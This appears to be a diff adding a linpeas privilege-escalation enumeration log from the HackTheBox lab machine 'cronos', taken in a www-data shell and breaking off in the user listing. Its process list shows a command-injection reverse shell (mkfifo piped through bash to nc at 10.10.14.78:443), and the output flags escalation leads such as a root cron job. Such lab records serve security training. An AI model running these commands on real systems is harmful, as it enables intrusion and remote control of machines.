@@ -1,0 +1,1816 @@
+www-data@cronos /tmp $ ./linpeas.sh -a
+ Starting linpeas. Building blacklists...
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v2.7.9 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 99% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMangeta: Your username
+
+
+====================================( Basic information )=====================================
+OS: Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: cronos
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+====================================( System Information )====================================
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017
+Distributor ID:	Ubuntu
+Description:	Ubuntu 16.04.2 LTS
+Release:	16.04
+Codename:	xenial
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.16
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Date
+Thu Sep 10 17:00:35 EEST 2020
+
+[+] System stats
+Filesystem                   Size  Used Avail Use% Mounted on
+udev                         477M     0  477M   0% /dev
+tmpfs                        100M  5.7M   94M   6% /run
+/dev/mapper/cronos--vg-root   15G  2.7G   11G  20% /
+tmpfs                        497M     0  497M   0% /dev/shm
+tmpfs                        5.0M     0  5.0M   0% /run/lock
+tmpfs                        497M     0  497M   0% /sys/fs/cgroup
+/dev/sda1                    472M  153M  295M  35% /boot
+              total        used        free      shared  buff/cache   available
+Mem:        1015964      260752       95588       15616      659624      522132
+Swap:       1048572       13116     1035456
+
+[+] CPU info
+Architecture:          x86_64
+CPU op-mode(s):        32-bit, 64-bit
+Byte Order:            Little Endian
+CPU(s):                2
+On-line CPU(s) list:   0,1
+Thread(s) per core:    1
+Core(s) per socket:    1
+Socket(s):             2
+NUMA node(s):          1
+Vendor ID:             AuthenticAMD
+CPU family:            23
+Model:                 49
+Model name:            AMD EPYC 7302P 16-Core Processor
+Stepping:              0
+CPU MHz:               2994.375
+BogoMIPS:              5988.75
+Hypervisor vendor:     VMware
+Virtualization type:   full
+L1d cache:             32K
+L1i cache:             32K
+L2 cache:              512K
+L3 cache:              131072K
+NUMA node0 CPU(s):     0,1
+Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc extd_apicid eagerfpu pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap xsaveopt arat
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+SHLVL=2
+PS1=\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] 
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+_=./linpeas.sh
+TERM=xterm
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+HISTSIZE=0
+SHELL=bash
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a container? ........... No
+[+] Any running containers? ........ No
+
+
+=========================================( Devices )==========================================
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+sda5
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+/dev/mapper/cronos--vg-root /               ext4    errors=remount-ro 0       1
+UUID=259f5707-a2a1-4efc-9c76-1f74e1fc2f6e /boot           ext2    defaults        0       2
+/dev/mapper/cronos--vg-swap_1 none            swap    sw              0       0
+/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/curl
+/bin/ping
+/usr/bin/base64
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/python3
+/usr/bin/python2.7
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+/usr/bin/lxc
+
+[+] Installed Compiler
+/usr/share/gcc-5
+
+
+================================( Processes, Cron, Services, Timers & Sockets )================================
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+bind      1235  0.0  1.3 281848 13928 ?        Ssl  15:32   0:00 /usr/sbin/named -f -u bind -4
+daemon[0m    1072  0.0  0.1  26044  1960 ?        Ss   15:32   0:00 /usr/sbin/atd -f
+message+  1090  0.0  0.3  42972  3680 ?        Ss   15:32   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+mysql     1254  0.0 14.8 1304204 150968 ?      Ssl  15:32   0:02 /usr/sbin/mysqld
+root         1  0.0  0.5 119956  5148 ?        Ss   15:32   0:02 /sbin/init
+root       491  0.0  0.2  28508  2840 ?        Ss   15:32   0:00 /lib/systemd/systemd-journald
+root       560  0.0  0.1 102968  1288 ?        Ss   15:32   0:00 /sbin/lvmetad -f
+root       576  0.0  0.4  45456  4236 ?        Ss   15:32   0:00 /lib/systemd/systemd-udevd
+root      1051  0.0  0.2  29008  2568 ?        Ss   15:32   0:00 /usr/sbin/cron -f
+root      1054  0.3  0.4 752820  4436 ?        Ssl  15:32   0:20 /usr/bin/lxcfs /var/lib/lxcfs/
+root      1062  0.0  0.1   4400  1216 ?        Ss   15:32   0:00 /usr/sbin/acpid
+root      1065  0.0  0.5 185604  5092 ?        Ssl  15:32   0:03 /usr/bin/vmtoolsd
+root      1083  0.0  0.1  20100  1176 ?        Ss   15:32   0:00 /lib/systemd/systemd-logind
+root      1146  0.0  0.4 275860  4432 ?        Ssl  15:32   0:00 /usr/lib/accountsservice/accounts-daemon[0m
+root      1154  0.0  1.2 209448 13080 ?        Ssl  15:32   0:00 /usr/lib/snapd/snapd
+root      1190  0.0  0.4 277180  4140 ?        Ssl  15:32   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root      1205  0.0  0.0  13376   148 ?        Ss   15:32   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
+root      1233  0.0  0.4  65520  4900 ?        Ss   15:32   0:00 /usr/sbin/sshd -D
+root      1249  0.0  0.0   5224   120 ?        Ss   15:32   0:00 /sbin/iscsid
+root      1250  0.0  0.3   5724  3516 ?        S<Ls 15:32   0:00 /sbin/iscsid
+root      1329  0.0  0.1  19620  1928 ?        Ss   15:32   0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid
+root      1346  0.0  0.1  15940  1576 tty1     Ss+  15:32   0:00 /sbin/agetty --noclear tty1 linux
+root      1366  0.0  1.8 325588 18408 ?        Ss   15:32   0:00 /usr/sbin/apache2 -k start
+syslog    1086  0.0  0.2 256396  2784 ?        Ssl  15:32   0:00 /usr/sbin/rsyslogd -n
+systemd+   919  0.0  0.2 100324  2372 ?        Ssl  15:32   0:00 /lib/systemd/systemd-timesyncd
+www-data  1843  0.0  1.7 326360 17348 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1854  0.0  1.1 326144 11900 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1857  0.0  1.1 326152 11912 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1863  0.0  1.2 326152 12948 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1864  0.0  1.1 326144 12024 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1867  0.0  1.1 326152 11980 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1885  0.0  1.1 326152 11908 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1888  0.0  1.1 326152 12032 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1912  0.0  1.2 326152 12980 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  1922  0.0  1.1 326144 11892 ?        S    16:01   0:01 /usr/sbin/apache2 -k start
+www-data  2299  0.0  0.0   4508   788 ?        S    16:29   0:00 sh -c traceroute ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.78 443 >/tmp/f
+www-data  2302  0.0  0.0   4536   824 ?        S    16:29   0:00 cat /tmp/f
+www-data  2303  0.0  0.3  18216  3360 ?        S    16:29   0:00 /bin/bash -i
+www-data  2304  0.0  0.1  11304  1828 ?        S    16:29   0:00 nc 10.10.14.78 443
+www-data  2326  0.0  0.6  32172  6824 ?        S    16:32   0:00 python -c import pty; pty.spawn("/bin/bash")
+www-data  2327  0.0  0.3  18268  3480 pts/0    Ss   16:32   0:00 /bin/bash
+www-data 11596  0.4  0.2   4920  2312 pts/0    S+   17:00   0:00 /bin/sh ./linpeas.sh -a
+www-data 12147  0.0  0.2  34424  2964 pts/0    R+   17:00   0:00 ps aux
+www-data 12149  0.0  0.0  14944   784 pts/0    S+   17:00   0:00 sort
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root  1037528 Jun 24  2016 /bin/bash
+lrwxrwxrwx 1 root root        4 Mar 22  2017 /bin/sh -> dash
+-rwxr-xr-x 1 root root   326224 Jan 19  2017 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   618520 Jan 19  2017 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root   141904 Jan 19  2017 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root   453240 Jan 19  2017 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    44104 Dec 16  2016 /sbin/agetty
+lrwxrwxrwx 1 root root       20 Mar 22  2017 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root   783984 Dec  9  2016 /sbin/iscsid
+-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad
+-rwxr-xr-x 1 root root   513216 Feb 20  2017 /sbin/mdadm
+-rwxr-xr-x 1 root root   224208 Jan 12  2017 /usr/bin/dbus-daemon[0m
+-rwxr-xr-x 1 root root    18504 Feb  3  2017 /usr/bin/lxcfs
+-rwxr-xr-x 1 root root    44528 Feb  9  2017 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon[0m
+-rwxr-xr-x 1 root root    15048 Jan 18  2016 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root root 18977392 Feb 24  2017 /usr/lib/snapd/snapd
+-rwxr-xr-x 1 root root    48112 Apr  9  2016 /usr/sbin/acpid
+-rwxr-xr-x 1 root root   646080 Jul 15  2016 /usr/sbin/apache2
+-rwxr-xr-x 1 root root    26632 Jan 15  2016 /usr/sbin/atd
+-rwxr-xr-x 1 root root    44472 Apr  6  2016 /usr/sbin/cron
+-rwxr-xr-x 1 root root    48440 Apr 11  2016 /usr/sbin/irqbalance
+-rwxr-xr-x 1 root root 24741672 Feb  6  2017 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root   639672 Feb 15  2017 /usr/sbin/named
+-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root   799216 Aug 11  2016 /usr/sbin/sshd
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 process found (dump creds from memory as root)
+sshd Not Found
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+      2 php /var/www/laravel/artisan schedule:run
+      2 /usr/sbin/CRON -f
+      2 /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+-rw-r--r-- 1 root root  797 Apr  9  2017 /etc/crontab
+
+/etc/cron.d:
+total 24
+drwxr-xr-x  2 root root 4096 Mar 22  2017 .
+drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
+-rw-r--r--  1 root root  670 Mar  1  2016 php
+-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest
+
+/etc/cron.daily:
+total 60
+drwxr-xr-x  2 root root 4096 Apr  9  2017 .
+drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2
+-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
+-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
+-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
+-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
+-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
+-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
+-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
+-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
+-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
+-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
+-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 22  2017 .
+drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 22  2017 .
+drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x  2 root root 4096 Apr  9  2017 .
+drwxr-xr-x 95 root root 4096 Apr  9  2017 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
+-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
+-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+[+] Services
+[i] Search for outdated versions
+ [ + ]  acpid
+ [ + ]  apache-htcacheclean
+ [ + ]  apache2
+ [ + ]  apparmor
+ [ + ]  apport
+ [ + ]  atd
+ [ + ]  bind9
+ [ - ]  bootmisc.sh
+ [ - ]  checkfs.sh
+ [ - ]  checkroot-bootclean.sh
+ [ - ]  checkroot.sh
+ [ + ]  console-setup
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ + ]  grub-common
+ [ - ]  hostname.sh
+ [ - ]  hwclock.sh
+ [ + ]  irqbalance
+ [ + ]  iscsid
+ [ + ]  keyboard-setup
+ [ - ]  killprocs
+ [ + ]  kmod
+ [ - ]  lvm2
+ [ + ]  lvm2-lvmetad
+ [ + ]  lvm2-lvmpolld
+ [ + ]  lxcfs
+ [ - ]  lxd
+ [ + ]  mdadm
+ [ - ]  mdadm-waitidle
+ [ - ]  mountall-bootclean.sh
+ [ - ]  mountall.sh
+ [ - ]  mountdevsubfs.sh
+ [ - ]  mountkernfs.sh
+ [ - ]  mountnfs-bootclean.sh
+ [ - ]  mountnfs.sh
+ [ + ]  mysql
+ [ + ]  networking
+ [ + ]  ondemand
+ [ + ]  open-iscsi
+ [ + ]  open-vm-tools
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ + ]  procps
+ [ + ]  rc.local
+ [ + ]  resolvconf
+ [ - ]  rsync
+ [ + ]  rsyslog
+ [ - ]  screen-cleanup
+ [ - ]  sendsigs
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  ufw
+ [ - ]  umountfs
+ [ - ]  umountnfs.sh
+ [ - ]  umountroot
+ [ - ]  unattended-upgrades
+ [ + ]  urandom
+ [ - ]  uuidd
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
+/lib/systemd/system/emergency.service is executing some relative path
+/lib/systemd/system/networking.service is executing some relative path
+/lib/systemd/system/rescue.service is executing some relative path
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                          LEFT         LAST                          PASSED       UNIT                         ACTIVATES
+Thu 2020-09-10 17:26:21 EEST  24min left   Thu 2020-09-10 15:29:41 EEST  1h 32min ago snapd.refresh.timer          snapd.refresh.service
+Thu 2020-09-10 22:07:52 EEST  5h 5min left Thu 2020-09-10 15:29:41 EEST  1h 32min ago apt-daily.timer              apt-daily.service
+Fri 2020-09-11 15:47:41 EEST  22h left     Thu 2020-09-10 15:47:41 EEST  1h 14min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                           n/a          n/a                           n/a          ureadahead-stop.timer        ureadahead-stop.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
+:1.0                                   1 systemd         root             :1.0          init.scope                -          -                  
+:1.1                                1083 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
+:1.2                                1146 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
+:1.3                                1190 polkitd         root             :1.3          polkitd.service           -          -                  
+:1.348                             26592 busctl          www-data         :1.348        apache2.service           -          -                  
+com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
+com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
+org.freedesktop.Accounts            1146 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
+org.freedesktop.DBus                1090 dbus-daemon     messagebus       org.freedesktop.DBus dbus.service              -          -                  
+org.freedesktop.PolicyKit1          1190 polkitd         root             :1.3          polkitd.service           -          -                  
+org.freedesktop.hostname1              - -               -                (activatable) -                         -         
+org.freedesktop.locale1                - -               -                (activatable) -                         -         
+org.freedesktop.login1              1083 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
+org.freedesktop.network1               - -               -                (activatable) -                         -         
+org.freedesktop.resolve1               - -               -                (activatable) -                         -         
+org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -                  
+org.freedesktop.timedate1              - -               -                (activatable) -                         -         
+
+
+===================================( Network Information )====================================
+[+] Hostname, hosts and DNS
+cronos
+127.0.0.1	localhost
+127.0.1.1	cronos.hackthebox.gr	cronos
+
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+nameserver 10.10.10.2
+nameserver 8.8.8.8
+hackthebox.gr
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+# symbolic names for networks, see networks(5) for more information
+link-local 169.254.0.0
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:e9:3e  
+          inet addr:10.10.10.13  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:e93e/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb9:e93e/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2324415 errors:0 dropped:21 overruns:0 frame:0
+          TX packets:2019144 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:1652551880 (1.6 GB)  TX bytes:402555779 (402.5 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:1421 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1421 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:135573 (135.5 KB)  TX bytes:135573 (135.5 KB)
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         10.10.10.2      0.0.0.0         UG    0      0        0 ens160
+10.10.10.0      *               255.255.255.0   U     0      0        0 ens160
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.10.10.2               ether   00:50:56:b9:75:a0   C                     ens160
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 10.10.10.13:53          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -               
+tcp        0    169 10.10.10.13:45224       10.10.14.78:443         ESTABLISHED 2304/nc         
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 10.10.10.13:80          10.10.14.78:41732       ESTABLISHED -               
+udp        0      0 10.10.10.13:59815       8.8.8.8:53              ESTABLISHED -               
+udp        0      0 10.10.10.13:38383       10.10.10.2:53           ESTABLISHED -               
+udp        0      0 10.10.10.13:53          0.0.0.0:*                           -               
+
+[+] Can I sniff with tcpdump?
+No
+
+
+====================================( Users Information )=====================================
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[+] Do I have PGP keys?
+gpg Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
+gdb wasn't found in PATH
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+It's not possible to brute-force su.
+
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
